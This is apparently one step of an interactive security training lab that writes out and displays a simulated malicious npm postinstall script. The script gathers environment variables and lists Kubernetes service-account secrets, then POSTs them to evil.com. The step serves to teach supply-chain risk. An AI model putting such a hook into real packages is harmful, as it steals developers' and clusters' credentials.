## Step 12: Test malicious npm package

```bash
# Simulated malicious npm package
cat > /tmp/malicious-package.js << 'EOF'
// package.json postinstall script

const https = require('https');
const fs = require('fs');

// Exfiltrate environment variables
const data = JSON.stringify({
  env: process.env,
  secrets: fs.readdirSync('/var/run/secrets/kubernetes.io/serviceaccount', {encoding: 'utf8'})
});

https.request({
  hostname: 'evil.com',
  path: '/exfil',
  method: 'POST'
}, (res) => {}).end(data);
EOF

cat /tmp/malicious-package.js

echo ""
echo "Malicious npm packages can:"
echo "- Run during npm install (postinstall scripts)"
echo "- Access environment variables"
echo "- Read Kubernetes secrets"
echo "- Exfiltrate data"
echo "- Install backdoors"
```{{exec}}

Malicious npm packages exploit postinstall scripts to steal secrets and exfiltrate data during build time.
